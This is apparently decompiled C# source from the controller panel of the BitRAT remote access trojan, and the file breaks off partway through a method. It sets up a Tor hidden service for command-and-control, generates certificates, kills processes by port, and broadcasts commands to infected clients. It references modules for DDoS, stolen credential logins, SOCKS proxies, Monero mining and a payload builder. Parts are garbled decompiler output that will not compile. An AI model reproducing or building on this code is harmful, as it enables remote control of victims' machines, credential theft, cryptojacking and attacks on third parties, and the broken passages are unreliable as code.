﻿using System;
using System.Collections;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Org.BouncyCastle.Asn1.X509;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Prng;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using Org.BouncyCastle.X509.Extension;

// Token: 0x0200014B RID: 331
[StandardModule]
internal sealed class Class136
{
	// Token: 0x0600127A RID: 4730
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern int GetTickCount();

	// Token: 0x0600127B RID: 4731
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long GetTickCount64();

	// Token: 0x0600127C RID: 4732
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern bool GetVersionExA(ref Class136.Struct27 struct27_0);

	// Token: 0x0600127D RID: 4733
	[DllImport("User32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ShowWindow(IntPtr intptr_0, int int_0);

	// Token: 0x0600127E RID: 4734
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long FindWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	// Token: 0x0600127F RID: 4735
	[DllImport("User32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long SetForeGroundWindow(long long_0);

	// Token: 0x06001280 RID: 4736
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool UpdateResource(IntPtr intptr_0, string string_0, string string_1, ushort ushort_0, IntPtr intptr_1, int int_0);

	// Token: 0x06001281 RID: 4737
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern IntPtr BeginUpdateResource(string string_0, [MarshalAs(UnmanagedType.Bool)] bool bool_0);

	// Token: 0x06001282 RID: 4738
	[DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	private static extern bool EndUpdateResource(IntPtr intptr_0, bool bool_0);

	// Token: 0x06001283 RID: 4739 RVA: 0x00084FBC File Offset: 0x000831BC
	public static X509Certificate2 smethod_0(string string_0, string string_1, int int_0)
	{
		SecureRandom secureRandom = new SecureRandom(new CryptoApiRandomGenerator());
		RsaKeyPairGenerator rsaKeyPairGenerator = new RsaKeyPairGenerator();
		rsaKeyPairGenerator.Init(new KeyGenerationParameters(secureRandom, int_0));
		AsymmetricCipherKeyPair asymmetricCipherKeyPair = rsaKeyPairGenerator.GenerateKeyPair();
		X509V3CertificateGenerator x509V3CertificateGenerator = new X509V3CertificateGenerator();
		X509Name x509Name = new X509Name("CN=" + string_0);
		BigInteger serialNumber = BigInteger.ProbablePrime(120, secureRandom);
		DateTime date = DateTime.UtcNow.Date;
		x509V3CertificateGenerator.SetSerialNumber(serialNumber);
		x509V3CertificateGenerator.SetSubjectDN(x509Name);
		x509V3CertificateGenerator.SetIssuerDN(x509Name);
		x509V3CertificateGenerator.SetNotBefore(date);
		x509V3CertificateGenerator.SetNotAfter(date.AddYears(99));
		x509V3CertificateGenerator.SetPublicKey(asymmetricCipherKeyPair.Public);
		x509V3CertificateGenerator.AddExtension(X509Extensions.SubjectKeyIdentifier, false, new SubjectKeyIdentifierStructure(asymmetricCipherKeyPair.Public));
		x509V3CertificateGenerator.AddExtension(X509Extensions.BasicConstraints, true, new BasicConstraints(true));
		ISignatureFactory signatureFactory = new Asn1SignatureFactory(string_1, asymmetricCipherKeyPair.Private, secureRandom);
		X509Certificate x509Certificate = x509V3CertificateGenerator.Generate(signatureFactory);
		return new X509Certificate2(DotNetUtilities.ToX509Certificate(x509Certificate))
		{
			PrivateKey = DotNetUtilities.ToRSA(asymmetricCipherKeyPair.Private as RsaPrivateCrtKeyParameters)
		};
	}

	// Token: 0x06001284 RID: 4740 RVA: 0x0000A3A9 File Offset: 0x000085A9
	public static void smethod_1()
	{
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O9m*?64D", null);
	}

	// Token: 0x06001285 RID: 4741 RVA: 0x000850B8 File Offset: 0x000832B8
	public static void smethod_2(string string_0)
	{
		object[] object_ = new object[]
		{
			string_0
		};
		Class149.smethod_0().method_139(Class149.smethod_1(), ")&O7u*?7ls", object_);
	}

	// Token: 0x06001286 RID: 4742 RVA: 0x000850E8 File Offset: 0x000832E8
	public static string[] smethod_3(string[] string_0)
	{
		ArrayList arrayList = new ArrayList();
		checked
		{
			int num = string_0.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!arrayList.Contains(string_0[i].Trim()))
				{
					arrayList.Add(string_0[i].Trim());
				}
			}
			string[] array = new string[arrayList.Count - 1 + 1];
			arrayList.CopyTo(array);
			return array;
		}
	}

	// Token: 0x06001287 RID: 4743 RVA: 0x00085144 File Offset: 0x00083344
	public static object smethod_4(string string_0)
	{
		try
		{
			foreach (KeyValuePair<string, cFWIP> keyValuePair in Class130.concurrentDictionary_9)
			{
				if (Strings.InStr(keyValuePair.Value.IP, "*", CompareMethod.Text) != 0)
				{
					Strings.Replace(keyValuePair.Value.IP, "*", string.Empty, 1, -1, CompareMethod.Text);
					if (Strings.InStr(string_0, Strings.Replace(keyValuePair.Value.IP, "*", string.Empty, 1, -1, CompareMethod.Text), CompareMethod.Text) > 0)
					{
						keyValuePair.Value.ATTEMPTS = Conversions.ToString(Conversion.Val(keyValuePair.Value.ATTEMPTS) + 1.0);
						Class130.concurrentQueue_1.Enqueue(keyValuePair.Value);
						return true;
					}
				}
				else if (Operators.CompareString(keyValuePair.Value.IP, string_0, true) == 0)
				{
					keyValuePair.Value.ATTEMPTS = Conversions.ToString(Conversion.Val(keyValuePair.Value.ATTEMPTS) + 1.0);
					Class130.concurrentQueue_1.Enqueue(keyValuePair.Value);
					return true;
				}
			}
		}
		finally
		{
			IEnumerator<KeyValuePair<string, cFWIP>> enumerator;
			if (enumerator != null)
			{
				enumerator.Dispose();
			}
		}
		return false;
	}

	// Token: 0x06001288 RID: 4744 RVA: 0x000852AC File Offset: 0x000834AC
	public static bool smethod_5(string string_0)
	{
		string extension = Path.GetExtension(string_0);
		return Operators.CompareString(extension, ".jpg", true) == 0 | Operators.CompareString(extension, ".jpeg", true) == 0 | Operators.CompareString(extension, ".gif", true) == 0 | Operators.CompareString(extension, ".png", true) == 0 | Operators.CompareString(extension, ".bmp", true) == 0 | Operators.CompareString(extension, ".tiff", true) == 0 | Operators.CompareString(extension, ".svg", true) == 0;
	}

	// Token: 0x06001289 RID: 4745 RVA: 0x0000A3C0 File Offset: 0x000085C0
	public static string smethod_6()
	{
		return (string)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O9!*?8r<", null);
	}

	// Token: 0x0600128A RID: 4746 RVA: 0x00085330 File Offset: 0x00083530
	public static bool smethod_7(string string_0, int int_0)
	{
		object[] object_ = new object[]
		{
			string_0,
			int_0
		};
		return (bool)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O6>*?6+A", object_);
	}

	// Token: 0x0600128B RID: 4747 RVA: 0x00085370 File Offset: 0x00083570
	public static void smethod_8(bool bool_0)
	{
		try
		{
			Class130.fSettings_0.vmethod_244().GridLines = bool_0;
			Class130.fMain_0.vmethod_18().GridLines = bool_0;
			try
			{
				foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
				{
					if (keyValuePair.Value.fDB != null)
					{
						keyValuePair.Value.fDB.vmethod_316().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_718().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_418().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_76().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_720().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_552().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_388().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_78().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_578().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_550().GridLines = bool_0;
						keyValuePair.Value.fDB.vmethod_624().GridLines = bool_0;
						if (keyValuePair.Value.fSrch != null)
						{
							keyValuePair.Value.fSrch.vmethod_6().GridLines = bool_0;
						}
					}
					Application.DoEvents();
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, CClient>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
			Class130.fBuilder_0.vmethod_38().GridLines = bool_0;
			Class130.fCredentialsLogins_0.vmethod_52().GridLines = bool_0;
			Class130.fCredentialsLogins_0.vmethod_10().GridLines = bool_0;
			Class130.fDDOS_0.vmethod_38().GridLines = bool_0;
			Class130.fOnJoin_0.vmethod_8().GridLines = bool_0;
			Class130.fSocks4R_0.vmethod_48().GridLines = bool_0;
			Class130.fSocks5_0.vmethod_20().GridLines = bool_0;
			Class130.fTransferManager_0.vmethod_20().GridLines = bool_0;
			Class130.fMinerXMR_0.vmethod_22().GridLines = bool_0;
			Class130.fMinerXMRLogManager_0.vmethod_0().GridLines = bool_0;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600128C RID: 4748 RVA: 0x000855E8 File Offset: 0x000837E8
	public static string smethod_9(string string_0, string string_1)
	{
		Process process = new Process();
		string result;
		try
		{
			Process process2 = process;
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			process2.StartInfo.FileName = string_0;
			process2.StartInfo.Arguments = string_1;
			process2.Start();
			string text = process2.StandardOutput.ReadToEnd();
			process.WaitForExit();
			result = text;
		}
		catch (Exception ex)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x0600128D RID: 4749 RVA: 0x00085674 File Offset: 0x00083874
	public static int smethod_10(string string_0, int int_0)
	{
		checked
		{
			try
			{
				string[] array = string_0.Split(new char[]
				{
					'\n'
				});
				int num = 0;
				char[] separator = new char[]
				{
					' '
				};
				int num2 = array.Count<string>() - 1;
				for (int i = 0; i <= num2; i++)
				{
					string text = array[i].Trim();
					if (!string.IsNullOrEmpty(text) && i > 3 && text.StartsWith("TCP"))
					{
						Class136.Struct28[] array2 = (Class136.Struct28[])Utils.CopyArray(array2, new Class136.Struct28[num + 1]);
						string[] array3 = text.Split(separator, StringSplitOptions.RemoveEmptyEntries);
						Class136.Struct28[] array4 = array2;
						int num3 = num;
						array4[num3].int_0 = Conversions.ToInteger(array3[1].Substring(array3[1].LastIndexOf(":") + 1));
						if (Conversion.Val(array4[num3].int_0) == (double)int_0)
						{
							return Conversions.ToInteger(array3[4]);
						}
						num++;
					}
				}
			}
			catch (Exception ex)
			{
			}
			return 0;
		}
	}

	// Token: 0x0600128E RID: 4750 RVA: 0x00085780 File Offset: 0x00083980
	public static void smethod_11(int int_0)
	{
		try
		{
			int num = Class136.smethod_10(Class136.smethod_9("netstat", "-aon"), int_0);
			if (num > 0)
			{
				Process.GetProcessById(num).Kill();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600128F RID: 4751 RVA: 0x000857D4 File Offset: 0x000839D4
	public static void smethod_12()
	{
		if (Class130.fTorConfig_0.InvokeRequired)
		{
			Class130.fTorConfig_0.Invoke(new Class136.Delegate110(Class136.smethod_12), new object[0]);
			return;
		}
		try
		{
			string text = Application.StartupPath + "\\data\\tor\\html";
			string text2 = Application.StartupPath + "\\data\\tor\\data";
			string str = "\"" + Application.StartupPath + "\\data\\tor\\torrc-srv\"";
			Class130.fTorConfig_0.method_2("Starting Tor process. Please wait...", false);
			Class136.smethod_11(54311);
			string text3 = "SOCKSPort 54311\r\n";
			text3 = Conversions.ToString(Operators.ConcatenateObject(text3, Operators.ConcatenateObject(Operators.ConcatenateObject("DirCache ", Interaction.IIf(Class135.smethod_0().TorDisableCaching, "0", "1")), "\r\n")));
			text3 = text3 + "HiddenServiceDir " + text + "\r\n";
			text3 = text3 + "DataDirectory " + text2 + "\r\n";
			text3 = text3 + "HiddenServicePort 80 127.0.0.1:" + Conversions.ToString(Class135.smethod_0().PortTor) + "\r\n";
			text3 += "HiddenServiceVersion 3\r\n";
			text3 += "DoSCircuitCreationEnabled 0\r\n";
			text3 += "DoSCircuitCreationMinConnections 54311\r\n";
			text3 = Conversions.ToString(Operators.ConcatenateObject(text3, Operators.ConcatenateObject(Operators.ConcatenateObject("DoSRefuseSingleHopClientRendezvous ", Interaction.IIf(Class135.smethod_0().TorRejectSingleHop, "1", "0")), "\r\n")));
			text3 += "HiddenServiceMaxStreams 0\r\n";
			text3 = Conversions.ToString(Operators.ConcatenateObject(text3, Operators.ConcatenateObject(Operators.ConcatenateObject("NoExec ", Interaction.IIf(Class135.smethod_0().TorNoExec, "1", "0")), "\r\n")));
			text3 = Conversions.ToString(Operators.ConcatenateObject(text3, Operators.ConcatenateObject(Operators.ConcatenateObject("ConstrainedSockets ", Interaction.IIf(Class135.smethod_0().TorUseConstrainedSockets, "1", "0")), "\r\n")));
			if (Class135.smethod_0().TorUseConstrainedSockets)
			{
				text3 = text3 + "ConstrainedSockSize " + Class135.smethod_0().TorConstrainedSocketSize + "\r\n";
			}
			text3 = Conversions.ToString(Operators.ConcatenateObject(text3, Operators.ConcatenateObject("AvoidDiskWrites ", Interaction.IIf(Class135.smethod_0().TorAvoidDiskWrites, "1", "0"))));
			if (text3.EndsWith("\r\n"))
			{
				text3 = text3.Remove(text3.LastIndexOf("\r\n"));
			}
			string text4 = Application.StartupPath + "\\data\\tor\\torrc-srv";
			byte[] bytes = Encoding.UTF8.GetBytes(text3);
			bool flag = true;
			byte[] byte_ = bytes;
			string string_ = text4;
			Class136.Class142 @class = new Class136.Class142();
			@class.string_0 = string_;
			@class.byte_0 = byte_;
			@class.bool_0 = false;
			try
			{
				if (flag)
				{
					new Thread(new ThreadStart(@class._Lambda$__0)).Start();
				}
				else
				{
					Class136.smethod_15(ref @class.string_0, ref @class.byte_0, @class.bool_0);
				}
			}
			catch (Exception ex)
			{
			}
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			else
			{
				foreach (string path in Directory.GetDirectories(text2))
				{
					try
					{
						Directory.Delete(path, true);
					}
					catch (Exception ex2)
					{
					}
				}
				foreach (string path2 in Directory.GetFiles(text2))
				{
					try
					{
						File.Delete(path2);
					}
					catch (Exception ex3)
					{
					}
				}
			}
			Class130.process_0 = new Process();
			Class130.process_0.StartInfo.FileName = Application.StartupPath + "\\data\\tor\\tor.exe";
			Class130.process_0.StartInfo.Arguments = "-f " + str;
			Class130.process_0.StartInfo.WorkingDirectory = Application.StartupPath + "\\data\\tor\\";
			Class130.process_0.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Class130.process_0.StartInfo.CreateNoWindow = true;
			Class130.process_0.Start();
			Class136.Struct27 @struct = default(Class136.Struct27);
			@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
			bool flag2 = false;
			if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
			{
				flag2 = true;
			}
			long num;
			if (flag2)
			{
				num = Class136.GetTickCount64();
			}
			else
			{
				num = (long)Class136.GetTickCount();
			}
			long num2 = num;
			if (!File.Exists(Application.StartupPath + "\\data\\tor\\html\\hostname"))
			{
				while (!File.Exists(Application.StartupPath + "\\data\\tor\\html\\hostname"))
				{
					@struct = default(Class136.Struct27);
					@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
					flag2 = false;
					if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
					{
						flag2 = true;
					}
					if (flag2)
					{
						num = Class136.GetTickCount64();
					}
					else
					{
						num = (long)Class136.GetTickCount();
					}
					if (checked(num - num2) > 90000L)
					{
						Class130.fTorConfig_0.method_2("Failed to create a hostname!", true);
						Interaction.MsgBox("Failed to create a hostname!", MsgBoxStyle.Critical, Application.ProductName);
						return;
					}
					Thread.Sleep(1);
				}
				TextBox textBox = Class130.fTorConfig_0.vmethod_18();
				string text5 = Application.StartupPath + "\\data\\tor\\html\\hostname";
				textBox.Text = Strings.Replace(Class136.smethod_14(ref text5), "\r\n", string.Empty, 1, -1, CompareMethod.Text);
				Class130.fTorConfig_0.vmethod_18().Enabled = true;
				Class130.fTorConfig_0.vmethod_28().Enabled = true;
			}
			@struct = default(Class136.Struct27);
			@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
			flag2 = false;
			if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
			{
				flag2 = true;
			}
			if (flag2)
			{
				num = Class136.GetTickCount64();
			}
			else
			{
				num = (long)Class136.GetTickCount();
			}
			num2 = num;
			while (!Class130.process_0.HasExited)
			{
				@struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				flag2 = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag2 = true;
				}
				if (flag2)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				if (checked(num - num2) > 5000L)
				{
					break;
				}
				Application.DoEvents();
			}
			if (Class130.process_0.HasExited)
			{
				Class130.struct18_3.method_1(false);
				Class130.fTorConfig_0.vmethod_22().Text = "Start";
				Class130.fTorConfig_0.method_2("Tor hidden service failed to start. Already running?", true);
			}
			else
			{
				Class130.fTorConfig_0.method_2("Tor hidden service active with PID " + Conversions.ToString(Class130.process_0.Id), false);
				Class130.fTorConfig_0.method_3("Stop");
				Class130.fTorConfig_0.vmethod_10().Enabled = false;
				if (!Class130.fTorConfig_0.vmethod_20().IsBusy)
				{
					Class130.fTorConfig_0.vmethod_20().RunWorkerAsync();
				}
				Class130.struct18_3.method_1(true);
			}
		}
		catch (Exception ex4)
		{
			try
			{
				Class130.struct18_3.method_1(false);
				Class130.fTorConfig_0.vmethod_22().Text = "Start";
				Class130.fTorConfig_0.method_2("Tor hidden service failed to start (" + ex4.Message + ")", true);
			}
			catch (Exception ex5)
			{
			}
		}
	}

	// Token: 0x06001290 RID: 4752 RVA: 0x0000A3DC File Offset: 0x000085DC
	public static string smethod_13(ref string string_0)
	{
		return Convert.ToBase64String(File.ReadAllBytes(string_0));
	}

	// Token: 0x06001291 RID: 4753 RVA: 0x0000A3EA File Offset: 0x000085EA
	public static string smethod_14(ref string string_0)
	{
		return Encoding.UTF8.GetString(File.ReadAllBytes(string_0));
	}

	// Token: 0x06001292 RID: 4754 RVA: 0x00085F80 File Offset: 0x00084180
	internal static void smethod_15(ref string string_0, ref byte[] byte_0, bool bool_0)
	{
		try
		{
			if (!Directory.Exists(Path.GetDirectoryName(string_0)))
			{
				Directory.CreateDirectory(Path.GetDirectoryName(string_0));
			}
			Class145.smethod_0().FileSystem.WriteAllBytes(string_0, byte_0, bool_0);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06001293 RID: 4755 RVA: 0x00085FDC File Offset: 0x000841DC
	public static long smethod_16(ref string string_0)
	{
		return Conversions.ToLong(Interaction.IIf(File.Exists(string_0), (File.GetLastWriteTimeUtc(string_0) - new DateTime(1970, 1, 1)).TotalSeconds, 0));
	}

	// Token: 0x06001294 RID: 4756 RVA: 0x0000A3FD File Offset: 0x000085FD
	public static void smethod_17(ref string string_0)
	{
		Directory.CreateDirectory(string_0);
	}

	// Token: 0x06001295 RID: 4757 RVA: 0x00086028 File Offset: 0x00084228
	public static Image smethod_18(ref byte[] byte_0)
	{
		Image result;
		try
		{
			result = Image.FromStream(new MemoryStream(byte_0));
		}
		catch (Exception ex)
		{
			result = Image.FromFile(Application.StartupPath + "\\data\\media\\icons\\exe.ico");
		}
		return result;
	}

	// Token: 0x06001296 RID: 4758 RVA: 0x00086078 File Offset: 0x00084278
	public static string smethod_19(int int_0)
	{
		string result;
		switch (int_0)
		{
		case 1:
			result = "Realtime";
			break;
		case 2:
			result = "High";
			break;
		case 3:
			result = "Above normal";
			break;
		case 4:
			result = "Normal";
			break;
		case 5:
			result = "Below normal";
			break;
		case 6:
			result = "Low";
			break;
		default:
			result = "Normal";
			break;
		}
		return result;
	}

	// Token: 0x06001297 RID: 4759 RVA: 0x000860E0 File Offset: 0x000842E0
	public static int smethod_20(string string_0, char char_0)
	{
		return string_0.Count(new Func<char, bool>(new Class136.Class141
		{
			char_0 = char_0
		}._Lambda$__0));
	}

	// Token: 0x06001298 RID: 4760 RVA: 0x0000A407 File Offset: 0x00008607
	public static string smethod_21(ref string string_0)
	{
		if (string_0.Length > 0 && Operators.CompareString(Strings.Right(string_0, 1), "\\", true) == 0)
		{
			string_0 = Strings.Mid(string_0, 1, checked(string_0.Length - 1));
		}
		return Directory.GetParent(string_0).FullName;
	}

	// Token: 0x06001299 RID: 4761 RVA: 0x0008610C File Offset: 0x0008430C
	private static void smethod_22(ref string string_0)
	{
		if (Class130.concurrentDictionary_3.Count != 0)
		{
			try
			{
				foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
				{
					CClient value = keyValuePair.Value;
					long num = 0L;
					ref string ptr = ref string_0;
					ref CClient ptr2 = ref value;
					try
					{
						if (num > 0L)
						{
							Thread.Sleep(checked((int)(num * 60000L)));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient = ptr2;
						ref double ptr3 = ref cclient.stats_bytes_out;
						cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_3;
						Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_5;
						Class130.struct20_0.double_5 = ptr3 + 1.0;
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, CClient>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}
	}

	// Token: 0x0600129A RID: 4762 RVA: 0x00086238 File Offset: 0x00084438
	public static void smethod_23(string string_0)
	{
		new Thread(new ThreadStart(new Class136.Class140
		{
			string_0 = string_0
		}._Lambda$__0)).Start();
	}

	// Token: 0x0600129B RID: 4763 RVA: 0x00086268 File Offset: 0x00084468
	private static void smethod_24()
	{
		if (Class130.concurrentDictionary_3.Count != 0)
		{
			try
			{
				foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
				{
					CClient value = keyValuePair.Value;
					string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
					{
						"settings|",
						keyValuePair.Value.sKey,
						"|",
						Conversions.ToString(Class135.smethod_0().TransfersRecvBytes),
						"|",
						Conversions.ToString(Class135.smethod_0().TransfersSendBytes),
						"|",
						Conversions.ToString(Class135.smethod_0().TransfersConcurrentMax),
						"|",
						Conversions.ToString(Class135.smethod_0().MaxBandwidthRateIn),
						"|"
					}), Interaction.IIf(Class135.smethod_0().TransferReplaceExisting, "1", "0")), "|"), Interaction.IIf(Class135.smethod_0().TransferReplaceFilesModified, "1", "0")));
					long num = 0L;
					ref string ptr = ref text;
					ref CClient ptr2 = ref value;
					try
					{
						if (num > 0L)
						{
							Thread.Sleep(checked((int)(num * 60000L)));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient = ptr2;
						ref double ptr3 = ref cclient.stats_bytes_out;
						cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_3;
						Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_5;
						Class130.struct20_0.double_5 = ptr3 + 1.0;
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, CClient>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}
	}

	// Token: 0x0600129C RID: 4764 RVA: 0x00086490 File Offset: 0x00084690
	private static void smethod_25(bool bool_0)
	{
		if (Class130.concurrentDictionary_3.Count != 0)
		{
			try
			{
				foreach (KeyValuePair<string, CClient> keyValuePair in Class130.concurrentDictionary_3)
				{
					CClient value = keyValuePair.Value;
					string text = Conversions.ToString(Operators.ConcatenateObject(Interaction.IIf(bool_0, "thumb_start", "thumb_stop"), "|1"));
					long num = 0L;
					ref string ptr = ref text;
					ref CClient ptr2 = ref value;
					try
					{
						if (num > 0L)
						{
							Thread.Sleep(checked((int)(num * 60000L)));
						}
						ptr += "@";
						byte[] bytes = Encoding.UTF8.GetBytes(ptr);
						ptr2.sock_async.method_6(bytes);
						CClient cclient = ptr2;
						ref double ptr3 = ref cclient.stats_bytes_out;
						cclient.stats_bytes_out = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_3;
						Class130.struct20_0.double_3 = ptr3 + (double)ptr.Length;
						ptr3 = ref Class130.struct20_0.double_5;
						Class130.struct20_0.double_5 = ptr3 + 1.0;
					}
					catch (Exception ex)
					{
					}
				}
			}
			finally
			{
				IEnumerator<KeyValuePair<string, CClient>> enumerator;
				if (enumerator != null)
				{
					enumerator.Dispose();
				}
			}
		}
	}

	// Token: 0x0600129D RID: 4765 RVA: 0x000865F8 File Offset: 0x000847F8
	public static string smethod_26(ref string string_0)
	{
		StringBuilder stringBuilder = new StringBuilder(string_0.Length / 2);
		checked
		{
			int num = string_0.Length - 2;
			for (int i = 0; i <= num; i += 2)
			{
				stringBuilder.Append(Strings.Chr((int)Convert.ToByte(string_0.Substring(i, 2), 16)));
			}
			return stringBuilder.ToString();
		}
	}

	// Token: 0x0600129E RID: 4766 RVA: 0x0000A447 File Offset: 0x00008647
	public static byte[] smethod_27(ref string string_0)
	{
		return Encoding.UTF8.GetBytes(string_0);
	}

	// Token: 0x0600129F RID: 4767 RVA: 0x0008664C File Offset: 0x0008484C
	public static string smethod_28(ref string string_0)
	{
		object[] array = new object[]
		{
			string_0
		};
		Class4 @class = Class149.smethod_0();
		Stream stream_ = Class149.smethod_1();
		string result;
		try
		{
			result = (string)@class.method_256(stream_, ")&O5f*?76a", array);
		}
		finally
		{
			string_0 = (string)array[0];
		}
		return result;
	}

	// Token: 0x060012A0 RID: 4768 RVA: 0x000866B0 File Offset: 0x000848B0
	public static string smethod_29(ref string string_0)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			using (MD5 md = MD5.Create())
			{
				byte[] array = md.ComputeHash(File.ReadAllBytes(string_0));
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("X2"));
				}
			}
			return stringBuilder.ToString().ToLower();
		}
	}

	// Token: 0x060012A1 RID: 4769 RVA: 0x0008672C File Offset: 0x0008492C
	public static uint smethod_30(string string_0)
	{
		object[] object_ = new object[]
		{
			string_0
		};
		return (uint)Class149.smethod_0().method_256(Class149.smethod_1(), ")&O5`*?8E-", object_);
	}

	// Token: 0x060012A2 RID: 4770 RVA: 0x00086764 File Offset: 0x00084964
	public static bool smethod_31(ref Collection collection_0, ref string string_0)
	{
		int num;
		bool result;
		int num4;
		object obj;
		try
		{
			IL_00:
			ProjectData.ClearProjectError();
			num = 1;
			IL_07:
			int num2 = 2;
			if (!Operators.ConditionalCompareObjectEqual(collection_0[string_0], null, true))
			{
				goto IL_21;
			}
			IL_1B:
			num2 = 3;
			result = false;
			goto IL_3D;
			IL_21:
			num2 = 4;
			result = (Information.Err().Number == 0);
			IL_31:
			num2 = 5;
			Information.Err().Clear();
			IL_3D:
			goto IL_A4;
			IL_3F:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_65:
			goto IL_99;
			IL_67:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_77:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_67;
		}
		IL_99:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_A4:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	// Token: 0x060012A3 RID: 4771 RVA: 0x00086830 File Offset: 0x00084A30
	public static long smethod_32(ref string string_0)
	{
		int num;
		long result;
		int num2;
		object obj;
		try
		{
			ProjectData.ClearProjectError();
			num = 2;
			result = new FileInfo(string_0).Length;
			IL_14:
			goto IL_63;
			IL_16:
			result = 0L;
			goto IL_14;
			IL_22:
			num2 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_36:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num2 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_22;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_63:
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	// Token: 0x060012A4 RID: 4772 RVA: 0x000868BC File Offset: 0x00084ABC
	public static string smethod_33(string string_0, string string_1, bool bool_0)
	{
		object[] object_ = new object[]
		{
			string_0,
			string_1,
			bool_0
		};
